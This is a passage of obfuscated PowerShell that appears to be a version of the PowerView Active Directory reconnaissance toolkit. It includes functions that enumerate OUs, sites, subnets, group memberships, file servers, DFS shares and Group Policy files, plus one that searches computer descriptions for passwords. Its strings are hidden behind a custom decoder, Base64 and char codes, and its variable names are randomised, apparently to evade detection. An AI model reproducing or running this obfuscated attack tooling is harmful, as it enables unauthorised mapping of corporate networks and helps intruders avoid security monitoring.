        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    if($Properties) {
        $Properties = ,(ParseEntry20 @(148,128,13,12,116,167,208,118) @(246,237,75,120,46)) + $Properties | Sort-Object -Unique
        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -Property $Properties
    }
    else {
        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property (ParseEntry20 @(71,44,166,242,250,66,46,124) @(19,65,224,134,160,19))
    }
}
function Find-ComputerField {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Term')]
        [String]
        $SearchTerm = 'pass',
        [Alias('Field')]
        [String]
        $SearchField = 'description',
        [String]
        $ADSpath,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        Get-NetComputer -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -FullData -Filter ("(" + $SearchField + ([char]0x3d+[char]0x2a) + $SearchTerm + ([char]0x2a+[char]0x29)) -PageSize $PageSize | Select-Object samaccountname,$SearchField
    }
}
function Get-NetOU {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $OUName = '*',
        [String]
        $GUID,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $FullData,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $V702K = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($V702K) {
            if ($GUID) {
                $V702K.filter=((ParseEntry20 @(166,141,189,8,143,252,174,22,183,153,170,87,188,252,162,87,183,153,128,17,142,160,143,94,143,253,174,9,180,153,209,23,136,163,162,87,140,153,221,18,180,153,156,49,143,163,136,87,166,157,140,18,180,153,213,11,189,159,217,90) @(237,206,228,103)) + $OUName + (ParseEntry20 @(36,184,246,24,25,40,147,238,20,23,28,210,213,17,71,82) @(111,235,158,118,122)) + $GUID + (ParseEntry20 @(222,82,3,147) @(149,59,104,227,122,4,111)))
            }
            else {
                $V702K.filter=((ParseEntry20 @(88,29,138,23,237,219,178,98,4,132,54,191,184,202,85,110,137,47,235,159,155,125,53,234,26,188,163,150,74,9,230,8,234,132,190,35,63,132,65,250,176,175,107,8,177,21,227,217,179,64,54,166,33,216,216,148,67,15,238,69) @(19,94,211,120,143,233,248)) + $OUName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KSk="))))
            }
            $V702K.FindAll() | Where-Object {$_} | ForEach-Object {
                if ($FullData) {
                    Convert-LDAPProperty -Properties $_.Properties
                }
                else { 
                    $_.properties.adspath
                }
            }
        }
    }
}
function Get-NetSite {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $GUID,
        [Switch]
        $FullData,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $sBrKi8 = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix (ParseEntry20 @(14,88,110,102,147,248,176,123,5,48,23,44,151,250,232,114,14,90,99,42,156,167,176,37,59,48,16,55,162,141,176,61,61,15,103,98) @(95,104,90,95,198,202,220,75)) -PageSize $PageSize
    }
    process {
        if($sBrKi8) {
            if ($GUID) {
                $sBrKi8.filter=((ParseEntry20 @(221,205,196,248,223,202,75,127,204,217,211,167,236,202,71,62,204,217,249,225,222,150,106,55,245,188,241,167,231,171,106,97,244,227,219,227,231,172,49,51) @(150,142,157,151,189,248,1,14)) + $SiteName + (ParseEntry20 @(52,27,73,181,249,56,48,81,185,247,12,113,106,188,167,66) @(127,72,33,219,154)) + $GUID + (ParseEntry20 @(86,121,102,128) @(29,16,13,240,93,33,137)))
            }
            else {
                $sBrKi8.filter=((ParseEntry20 @(192,42,56,131,193,45,46,250,51,54,162,147,78,86,205,89,59,187,199,105,7,229,2,88,143,145,115,84,209,58,10,131,193,114,34,255,51,53,220,158) @(139,105,97,236,163,31,100)) + $SiteName + ([char]0x29+[char]0x29))
            }
            try {
                $sBrKi8.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        Convert-LDAPProperty -Properties $_.Properties
                    }
                    else {
                        $_.properties.name
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function Get-NetSubnet {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SiteName = "*",
        [String]
        $Domain,
        [String]
        $ADSpath,
        [String]
        $DomainController,
        [Switch]
        $FullData,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $sSLM = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix (ParseEntry20 @(193,89,83,139,92,163,63,14,208,100,198,89,4,203,113,212,61,13,131,93,241,49,53,222,106,233,17,35,230,99,161,45,5,128,60,253,8,48,214,56,243,4,33,130,104,199,80,18) @(144,105,103,178,9)) -PageSize $PageSize
    }
    process {
        if($sSLM) {
            $sSLM.filter=(ParseEntry20 @(250,69,130,170,10,131,76,170,159,63,255,54,138,247,46,129,92,140,161,30,210,104,176,252,11,130,80,178,167,5,231,54,144,150,3,140) @(177,6,219,197,104))
            try {
                $sSLM.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        Convert-LDAPProperty -Properties $_.Properties | Where-Object { $_.siteobject -match ((ParseEntry20 @(31,218,81,236) @(78,234,101,213,151,150)) + $SiteName) }
                    }
                    else {
                        if ( ($SiteName -and ($_.properties.siteobject -match ((ParseEntry20 @(87,39,199,193) @(6,23,243,248,228)) + $SiteName + ","))) -or ($SiteName -eq '*')) {
                            $cxFSl = @{
                                'Subnet' = $_.properties.name[0]
                            }
                            try {
                                $cxFSl['Site'] = ($_.properties.siteobject[0]).split(",")[0]
                            }
                            catch {
                                $cxFSl['Site'] = 'Error'
                            }
                            New-Object -TypeName PSObject -Property $cxFSl                 
                        }
                    }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function Get-DomainSID {
    param(
        [String]
        $Domain
    )
    $zImi = Get-NetDomain -Domain $Domain
    if($zImi) {
        $beM6n = $zImi.PdcRoleOwner
        $IB0u7O3M = (Get-NetComputer -Domain $Domain -ComputerName $beM6n -FullData).objectsid
        $A6w2GNY = $IB0u7O3M.split("-")
        $A6w2GNY[0..($A6w2GNY.length -2)] -join "-"
    }
}
function Get-NetGroup {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName = '*',
        [String]
        $SID,
        [String]
        $UserName,
        [String]
        $Filter,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $AdminCount,
        [Switch]
        $FullData,
        [Switch]
        $RawSids,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $mPpJqP = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if($mPpJqP) {
            if($AdminCount) {
                Write-Verbose (ParseEntry20 @(99,61,189,114,22,103,253,48,80,98,182,121,21,56,176,57,123,72,147,117,45,2,229,53,99,61,236,47,45,59,216,121,127,94,232,35) @(50,15,213,30,79,85,137,64))
                $Filter += (ParseEntry20 @(86,233,201,18,123,1,132,80,68,156,182,72,123,56,185,28,80,253,228,68) @(29,174,143,121,25,86,232,37))
            }
            if ($UserName) {
                $qzuM = Get-ADObject -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -ReturnRaw -PageSize $PageSize
                $QMqr = $qzuM.GetDirectoryEntry()
                $QMqr.RefreshCache((ParseEntry20 @(112,252,144,248,222,163,223,92,216,196,179,181,151,162,89,134) @(20,187,169,138,132,244,234)))
                $QMqr.TokenGroups | Foreach-Object {
                    $PfVgQi = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                    if(!($PfVgQi -match '^S-1-5-32-545|-513$')) {
                        if($FullData) {
                            Get-ADObject -SID $PfVgQi -PageSize $PageSize
                        }
                        else {
                            if($RawSids) {
                                $PfVgQi
                            }
                            else {
                                Convert-SidToName $PfVgQi
                            }
                        }
                    }
                }
            }
            else {
                if ($SID) {
                    $mPpJqP.filter = ((ParseEntry20 @(36,168,11,214,13,217,24,200,53,188,28,137,62,217,20,137,53,188,54,207,12,133,57,128,53,216,24,207,11,179,19,201,36,172,107,208,14,134,4,211,11,173,28,243,61,175,98,132) @(111,235,82,185)) + $SID + ")" + $Filter + ")")
                }
                else {
                    $mPpJqP.filter = ((ParseEntry20 @(30,8,25,47,104,102,64,36,17,23,14,58,5,56,19,123,26,23,110,34,105,59,32,121,26,57,30,124,49,19,1,48,65,19,63,61,41,23,21,51) @(85,75,64,64,10,84,10)) + $GroupName + ")" + $Filter + ")")
                }
                $mPpJqP.FindAll() | Where-Object {$_} | ForEach-Object {
                    if ($FullData) {
                        Convert-LDAPProperty -Properties $_.Properties
                    }
                    else {
                        $_.properties.samaccountname
                    }
                }
            }
        }
    }
}
function Get-NetGroupMember {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GroupName,
        [String]
        $SID,
        [String]
        $Domain = (Get-NetDomain).Name,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $FullData,
        [Switch]
        $Recurse,
        [Switch]
        $UseMatchingRule,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $mPpJqP = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
        if(!$DomainController) {
            $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
        }
    }
    process {
        if ($mPpJqP) {
            if ($Recurse -and $UseMatchingRule) {
                if ($GroupName) {
                    $tDwvKLfV = Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData -PageSize $PageSize
                }
                elseif ($SID) {
                    $tDwvKLfV = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                }
                else {
                    $SID = (Get-DomainSID -Domain $Domain) + (ParseEntry20 @(205,163,12,81,94,125,188,202) @(129,247,89,41,19,26))
                    $tDwvKLfV = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize
                }
                $PAYHdPHz = $tDwvKLfV.distinguishedname
                $dFLpq5 = $tDwvKLfV.name
                if ($PAYHdPHz) {
                    $mPpJqP.filter = ((ParseEntry20 @(92,45,44,21,179,37,40,1,43,135,89,4,23,73,134,98,10,51,40,229,116,41,32,67,159,83,47,68,55,170,86,92,56,0,137,35,37,38,18,164,77,57,68,19,138,79,36,3,32,186,120,22,57,16,153,98,33,49,43,167,91,4,48,2,157,109,59,68,52,185,35,22,57,16,129,98,35,33,17,224,90,58,26,67) @(23,110,117,122,208)) + $PAYHdPHz + ")" + $Filter + ")")
                    $mPpJqP.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))
                    $IdJ9 = $mPpJqP.FindAll()
                    $dFLpq5 = $GroupName
                }
                else {
                    Write-Error (ParseEntry20 @(137,136,161,242,134,178,236,246,150,151,198,236,150,152,206,234,189,178,197,253,141,236,222,236,187,135,213,167) @(223,223,148,154))
                }
            }
            else {
                if ($GroupName) {
                    $mPpJqP.filter = ((ParseEntry20 @(251,115,79,232,129,130,122,103,221,180,254,0,71,181,165,128,106,65,227,149,211,94,125,190,185,131,122,96,227,187,241,64,93,192,214,216,82,65,210,218) @(176,48,22,135,227)) + $GroupName + ")" + $Filter + ")")
                }
                elseif ($SID) {
                    $mPpJqP.filter = ((ParseEntry20 @(80,39,58,131,121,86,41,157,65,51,45,220,74,86,37,220,65,51,7,154,120,10,8,213,65,87,41,154,127,60,34,156,80,35,90,133,122,9,53,134,127,34,45,166,73,32,83,209) @(27,100,99,236)) + $SID + ")" + $Filter + ")")
                }
                else {
                    $SID = (Get-DomainSID -Domain $Domain) + (ParseEntry20 @(64,227,144,134,19,193,49,138) @(12,183,197,254,94,166))
                    $mPpJqP.filter = ((ParseEntry20 @(12,76,185,156,132,117,69,145,169,177,9,63,177,193,160,119,85,183,151,144,36,97,139,202,188,116,69,150,151,190,6,127,171,180,223,46,110,141,165,140,35,73,174,185,180,3,63,221) @(71,15,224,243,230)) + $SID + ")" + $Filter + ")")
                }
                $mPpJqP.FindAll() | ForEach-Object {
                    try {
                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }
                        $dFLpq5 = $_.properties.name[0]
                        $IdJ9 = @()
                        if ($_.properties.member.Count -eq 0) {
                            $PYngQ = $False
                            $f2Du = 0
                            $BqREdA = 0
                            while(!$PYngQ) {
                                $BqREdA = $f2Du + 1499
                                $swxU6B6=((ParseEntry20 @(5,92,241,247,62,102,241,250,40,56,237,235,5,102,195,239,55,90,154,190) @(103,11,167,131)) + $f2Du + "-" + $BqREdA)
                                $f2Du += 1500
                                $mPpJqP.PropertiesToLoad.Clear()
                                [void]$mPpJqP.PropertiesToLoad.Add(($swxU6B6))
                                try {
                                    $NW6jRjlY = $mPpJqP.FindOne()
                                    if ($NW6jRjlY) {
                                        $pC1f = $_.Properties.PropertyNames -like (ParseEntry20 @(228,79,158,157,212,247,208,97,135,218,199,242,228,117,172,133,221,201,233,37) @(134,24,200,233,141,154))
                                        $PCyLA1 = $_.Properties.item($pC1f)
                                        if ($PCyLA1.count -eq 0) {
                                            $PYngQ = $True
                                        }
                                        else {
                                            $PCyLA1 | ForEach-Object {
                                                $IdJ9 += $_
                                            }
                                        }
                                    }
                                    else {
                                        $PYngQ = $True
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    $PYngQ = $True
                                }
                            }
                        } 
                        else {
                            $IdJ9 = $_.properties.member
                        }
                    } 
                    catch {
                        Write-Verbose $_
                    }
                }
            }
            $IdJ9 | Where-Object {$_} | ForEach-Object {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                } 
                else {
                    if($DomainController) {
                        $NW6jRjlY = [adsi]((ParseEntry20 @(243,62,27,236,183,227,20,63,226,149,154,70) @(167,123,73,174,226)) + $DomainController + "/" + $_)
                    }
                    else {
                        $NW6jRjlY = [adsi]((ParseEntry20 @(102,192,128,197,101,166,176,80,126,242,239,186) @(50,133,210,135,48,226,223,38)) + $_)
                    }
                    if($NW6jRjlY){
                        $Properties = $NW6jRjlY.Properties
                    }
                }
                if($Properties) {
                    if($Properties.samaccounttype -notmatch '805306368') {
                        $GOwA = $True
                    }
                    else {
                        $GOwA = $False
                    }
                    if ($FullData) {
                        $IPiHHq = Convert-LDAPProperty -Properties $Properties
                    }
                    else {
                        $IPiHHq = New-Object PSObject
                    }
                    $IPiHHq | Add-Member Noteproperty 'GroupDomain' $Domain
                    $IPiHHq | Add-Member Noteproperty 'GroupName' $dFLpq5
                    try {
                        $EybC7 = $Properties.distinguishedname[0]
                        $YLe0 = $EybC7.subString($EybC7.IndexOf((ParseEntry20 @(241,21,117,174) @(163,80,56,151,11,71,115,75)))) -replace 'DC=','' -replace ',','.'
                    }
                    catch {
                        $EybC7 = $Null
                        $YLe0 = $Null
                    }
                    if ($Properties.samaccountname) {
                        $s15G = $Properties.samaccountname[0]
                    } 
                    else {
                        try {
                            $s15G = Convert-SidToName $Properties.cn[0]
                        }
                        catch {
                            $s15G = $Properties.cn
                        }
                    }
                    if($Properties.objectSid) {
                        $MrMfOu = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)
                    }
                    else {
                        $MrMfOu = $Null
                    }
                    $IPiHHq | Add-Member Noteproperty 'MemberDomain' $YLe0
                    $IPiHHq | Add-Member Noteproperty 'MemberName' $s15G
                    $IPiHHq | Add-Member Noteproperty 'MemberSid' $MrMfOu
                    $IPiHHq | Add-Member Noteproperty 'IsGroup' $GOwA
                    $IPiHHq | Add-Member Noteproperty 'MemberDN' $EybC7
                    $IPiHHq
                    if ($Recurse -and !$UseMatchingRule -and $GOwA -and $s15G) {
                        Get-NetGroupMember -FullData -Domain $YLe0 -DomainController $DomainController -GroupName $s15G -Recurse -PageSize $PageSize
                    }
                }
            }
        }
    }
}
function Get-NetFileServer {
    [CmdletBinding()]
    param(
        [String]
        $Domain,
        [String]
        $DomainController,
        [String[]]
        $TargetUsers,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    function SplitPath {
        param([String]$Path)
        if ($Path -and ($Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw=")))).Count -ge 3)) {
            $kTso = $Path.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))))[2]
            if($kTso -and ($kTso -ne '')) {
                $kTso
            }
        }
    }
    Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Where-Object {$_} | Where-Object {
            if($TargetUsers) {
                $TargetUsers -Match $_.samAccountName
            }
            else { $True } 
        } | Foreach-Object {
            if($_.homedirectory) {
                SplitPath($_.homedirectory)
            }
            if($_.scriptpath) {
                SplitPath($_.scriptpath)
            }
            if($_.profilepath) {
                SplitPath($_.profilepath)
            }
        } | Where-Object {$_} | Sort-Object -Unique
}
function Get-DFSshare {
    [CmdletBinding()]
    param(
        [String]
        [ValidateSet((ParseEntry20 @(90,173,39,58) @(11,250,95,73,135,145)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VjE="))),"1",([char]0x56+[char]0x32),"2")]
        $Version = (ParseEntry20 @(26,31,211,109) @(75,72,171,30,82)),
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    function Get-DFSshareV1 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,
            [String]
            $DomainController,
            [String]
            $ADSpath,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )
        $uZjYMk = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
        if($uZjYMk) {
            $ybIBLW = @()
            $uZjYMk.filter = (ParseEntry20 @(97,241,216,23,29,110,110,173,112,229,207,72,46,110,92,180,73,129,204,65,37,48,118,153,112,220,204,8,52,13,25,225) @(42,178,129,120,127,92,36,220))
            try {
                $uZjYMk.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $U4wVsDjl = $Properties.remoteservername
                    $ybIBLW += $U4wVsDjl | ForEach-Object {
                        try {
                            if ( $_.Contains('\') ) {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug ((ParseEntry20 @(250,141,5,1,170,247,188,207,180,24,76,175,167,178,238,172,44,74,164,177,175,209,151,10,42,164,137,146,203,231,39,16,171,169,160,207,154,38,57,245) @(168,213,79,120,200,196,245)) + $_)
                        }
                    }
                }
            }
            catch {
                Write-Warning ((ParseEntry20 @(13,156,245,210,19,251,241,165,10,157,237,141,6,246,233,142,9,196,234,133,5,246,233,155,61,157,234,133,16,199,226,223) @(95,174,163,226)) + $_)
            }
            $ybIBLW | Sort-Object -Property (ParseEntry20 @(82,17,89,83,144,52,46,99,114,192,81,5,107,74,164,126,40,98,97,134,93,45,50,26) @(7,124,15,39,242))
        }
    }
    function Get-DFSshareV2 {
        [CmdletBinding()]
        param(
            [String]
            $Domain,
            [String]
            $DomainController,
            [String]
            $ADSpath,
            [ValidateRange(1,10000)] 
            [Int]
            $PageSize = 200
        )
        $uZjYMk = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
        if($uZjYMk) {
            $ybIBLW = @()
            $uZjYMk.filter = (ParseEntry20 @(195,137,67,159,235,29,249,249,144,77,190,185,126,129,240,162,121,195,196,22,209,208,132,95,162,229,98,199,220,141,118,133,232,28,234,241,129,73,155,180) @(136,202,26,240,137,47,179))
            $uZjYMk.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
            try {
                $uZjYMk.FindAll() | Where-Object {$_} | ForEach-Object {
                    $Properties = $_.Properties
                    $wWyrJuG = $Properties.'msdfs-targetlistv2'[0]
                    $N3W25AE = [xml][System.Text.Encoding]::Unicode.GetString($wWyrJuG[2..($wWyrJuG.Length-1)])
                    $ybIBLW += $N3W25AE.targets.ChildNodes | ForEach-Object {
                        try {
                            $g51UVwUV = $_.InnerText
                            if ( $g51UVwUV.Contains('\') ) {
                                $Nmi8SkOB = $g51UVwUV.split("\")[3]
                                $dD9oqq92 = $Properties.'msdfs-linkpathv2'[0]
                                New-Object -TypeName PSObject -Property @{'Name'=($Nmi8SkOB + $dD9oqq92);'RemoteServerName'=$g51UVwUV.split("\")[2]}
                            }
                        }
                        catch {
                            Write-Debug ((ParseEntry20 @(142,131,4,97,190,232,7,127,189,140,122,127,191,156,8,97,191,233,34,109,134,162,12,40,133,131,4,118,134,131,31,127,147,178,15,37) @(220,219,78,24)) + $_)
                        }
                    }
                }
            }
            catch {
                Write-Warning ((ParseEntry20 @(123,176,119,253,200,59,123,197,116,254,202,1,112,218,107,161,210,4,96,229,123,149,206,23,75,177,104,170,203,7,104,191) @(41,130,33,205,132,110)) + $_)
            }
            $ybIBLW | Sort-Object -Unique -Property (ParseEntry20 @(55,62,241,168,0,96,245,176,55,97,241,165,6,62,241,165,54,62,225,168,56,2,154,225) @(98,83,167,220))
        }
    }
    $ybIBLW = @()
    if ( ($Version -eq (ParseEntry20 @(214,128,185,133) @(143,215,193,246,20))) -or ($Version.endsWith("1")) ) {
        $ybIBLW += Get-DFSshareV1 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    if ( ($Version -eq (ParseEntry20 @(62,172,49,219) @(103,251,73,168,187))) -or ($Version.endsWith("2")) ) {
        $ybIBLW += Get-DFSshareV2 -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    $ybIBLW | Sort-Object -Property (ParseEntry20 @(222,222,66,165,179,10,131,181,222,129,66,168,181,84,135,160,223,222,82,165,139,104,236,228) @(139,179,20,209,209,57,209,217))
}
function Get-GptTmpl {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GptTmplPath,
        [Switch]
        $UsePSDrive
    )
    begin {
        if($UsePSDrive) {
            $A6w2GNY = $GptTmplPath.split('\')
            $RGUSl5I = $A6w2GNY[0..($A6w2GNY.length-2)] -join '\'
            $FilePath = $A6w2GNY[-1]
            $Qh217c4 = ((ParseEntry20 @(131,96,255,201,143,157,97,216,249,231,178,71,212,206,161,169,85,226,150,163,185,127,243,218,182,233,101,132,199,187,190,3,208,251,186,231) @(218,55,181,163,213)).ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose ((ParseEntry20 @(78,127,184,242,127,42,72,88,227,174,126,35,121,111,199,243,124,7,91,21) @(26,40,129,195,29,68)) + $GptTmplPath + (ParseEntry20 @(224,60,47,120,62,79,156,26,48,69,26,127,205,51,47,118,60,91,235,37,44,50,13,97,200,44,35,110,22,95,239,68,48,67,98,37) @(169,116,121,2,95,24)) + $Qh217c4)
            try {
                $Null = New-PSDrive -Name $Qh217c4 -PSProvider FileSystem -Root $RGUSl5I  -ErrorAction Stop
            }
            catch {
                Write-Debug ((ParseEntry20 @(142,187,115,232,209,136,190,51,190,180,0,160,209,213,165,36,190,142,90,246,208,252,177,100,189,160,120,172) @(220,227,57,145,179,187,247,84)) + $GptTmplPath + (ParseEntry20 @(209,115,210,51) @(152,55,189,84,32,179,150)) + $_)
                return $Null
            }
            $GptTmplPath = $Qh217c4 + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
        } 
    }
    process {
        $Ox1uC = ''
        $KqbDt = @{}
        $WEvxvQr = @{}
        try {
            if(Test-Path $GptTmplPath) {
                Write-Verbose ((ParseEntry20 @(53,196,4,36,122,198,12,246,24,36,88,201) @(96,131,66,93,25,244)) + $GptTmplPath)
                Get-Content $GptTmplPath -ErrorAction Stop | Foreach-Object {
                    if ($_ -match '\[') {
                        $Ox1uC = $_.trim('[]') -replace ' ',''
                    }
                    elseif($_ -match '=') {
                        $A6w2GNY = $_.split('=')
                        $PropertyName = $A6w2GNY[0].trim()
                        $cHjL = $A6w2GNY[1].trim()
                        if($cHjL -match ',') {
                            $cHjL = $cHjL.split(',')
                        }
                        if(!$KqbDt[$Ox1uC]) {
                            $KqbDt.Add($Ox1uC, @{})
                        }
                        $KqbDt[$Ox1uC].Add( $PropertyName, $cHjL )
                    }
                }
                ForEach ($WkF0TVK in $KqbDt.keys) {
                    $WEvxvQr[$WkF0TVK] = New-Object PSObject -Property $KqbDt[$WkF0TVK]
                }
                New-Object PSObject -Property $WEvxvQr
            }
        }
        catch {
            Write-Debug ((ParseEntry20 @(34,219,197,169,18,176,198,183,19,196,201,169,19,177,227,165,42,250,206,237) @(112,131,143,208)) + $GptTmplPath + (ParseEntry20 @(176,239,46,38) @(249,171,65,65,148,230,63)) + $_)
        }
    }
    end {
        if($UsePSDrive -and $Qh217c4) {
            Write-Verbose ((ParseEntry20 @(121,23,155,242,218,168,1,67,78,23,174,225,220,220,13,71,79,57,143,215,237,171,9,74,77,34,151,234,241,218,102,14) @(44,122,205,134,184,155,91,51)) + $Qh217c4)
            Get-PSDrive -Name $Qh217c4 -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}
function Get-GroupsXML {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GroupsXMLPath,
        [Switch]
        $ResolveSids,
        [Switch]
        $UsePSDrive
    )
    begin {
        if($UsePSDrive) {
            $A6w2GNY = $GroupsXMLPath.split('\')
            $RGUSl5I = $A6w2GNY[0..($A6w2GNY.length-2)] -join '\'
            $FilePath = $A6w2GNY[-1]
            $Qh217c4 = ((ParseEntry20 @(140,151,87,127,63,146,150,112,79,87,189,176,124,120,17,166,162,74,32,19,182,136,91,108,6,230,146,44,113,11,177,244,120,77,10,232) @(213,192,29,21,101)).ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose ((ParseEntry20 @(77,97,51,69,249,5,196,105,84,103,23,252,8,209,95,6,107,55,218,86) @(25,54,10,116,155,107,150)) + $GroupsXMLPath + (ParseEntry20 @(34,124,180,137,172,93,146,149,34,115,167,148,169,77,241,143,8,119,160,162,152,58,245,130,10,108,184,159,132,77,225,203,34,117,223,206) @(107,52,226,243,205,10,167,251)) + $Qh217c4)
            try {
                $Null = New-PSDrive -Name $Qh217c4 -PSProvider FileSystem -Root $RGUSl5I  -ErrorAction Stop
            }
            catch {
                Write-Debug ((ParseEntry20 @(228,172,88,79,212,199,91,81,212,163,43,7,212,154,64,70,212,153,113,81,213,179,84,6,215,183,83,11) @(182,244,18,54)) + $GroupsXMLPath + (ParseEntry20 @(49,217,176,242) @(120,157,223,149,15,107,183)) + $_)
                return $Null
            }
            $GroupsXMLPath = $Qh217c4 + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
        } 
    }
    process {
        if(Test-Path $GroupsXMLPath) {
            [xml] $F6IlXblV = Get-Content $GroupsXMLPath
            $F6IlXblV | Select-Xml (ParseEntry20 @(81,196,211,195,126,208,211,186,126,252,215,182) @(29,189,234,139)) | Select-Object -ExpandProperty node | ForEach-Object {
                $IdJ9 = @()
                $fDZZ = @()
                $qbF4Ozdv = $_.Properties.GroupSid
                if(!$qbF4Ozdv) {
                    if($_.Properties.groupName -match 'Administrators') {
                        $qbF4Ozdv = 'S-1-5-32-544'
                    }
                    elseif($_.Properties.groupName -match 'Remote Desktop') {
                        $qbF4Ozdv = 'S-1-5-32-555'
                    }
                    else {
                        $qbF4Ozdv = $_.Properties.groupName
                    }
                }
                $fDZZ = @($qbF4Ozdv)
                $_.Properties.members | ForEach-Object {
                    $_ | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                        if($_.sid) {
                            $IdJ9 += $_.sid
                        }
                        else {
                            $IdJ9 += $_.name
                        }
                    }
                }
                if ($IdJ9 -or $fDZZ) {
                    $ihEQZ = $_.filters | ForEach-Object {
                        $_ | Select-Object -ExpandProperty Filter* | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    if($ResolveSids) {
                        $fDZZ = $fDZZ | ForEach-Object {Convert-SidToName $_}
                        $IdJ9 = $IdJ9 | ForEach-Object {Convert-SidToName $_}
                    }
                    if($fDZZ -isnot [system.array]) {$fDZZ = @($fDZZ)}
                    if($IdJ9 -isnot [system.array]) {$IdJ9 = @($IdJ9)}
                    $ByqH = @{
                        'GPODisplayName' = $GG4L2liq
                        'GPOName' = $GPOName
                        'GPOPath' = $GroupsXMLPath
                        'Filters' = $ihEQZ
                        'MemberOf' = $fDZZ
                        'Members' = $IdJ9
                    }
                    New-Object -TypeName PSObject -Property $ByqH
                }
            }
        }
    }
    end {
